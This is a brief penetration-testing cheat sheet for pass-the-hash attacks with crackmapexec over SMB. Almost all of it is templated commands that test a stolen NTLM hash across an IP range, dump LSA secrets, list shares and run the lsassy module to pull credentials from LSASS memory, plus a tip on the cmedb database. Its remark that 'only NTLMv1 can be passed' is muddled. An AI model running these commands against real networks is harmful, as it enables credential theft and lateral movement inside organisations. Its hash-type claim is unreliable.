Check machines if the hash can authenticate
 
### crackmapexec smb <ip/range> -u <user> -H <hash>

### crackmapexec smb <ip/range> -u <user> -H <hash> --local-auth --lsa

### crackmapexec smb <ip/range> -u <user> -H <hash> --local-auth --shares

### crackmapexec smb <ip/range> -u <user> -H <hash> --local-auth -M lsassy
 
To navigate the database:

### cmedb
 
*** ONLY NTLMv1 can be passed ^^  
((NTLMv2 can be relayed))
 
pwn3d! means you own the machine (admin)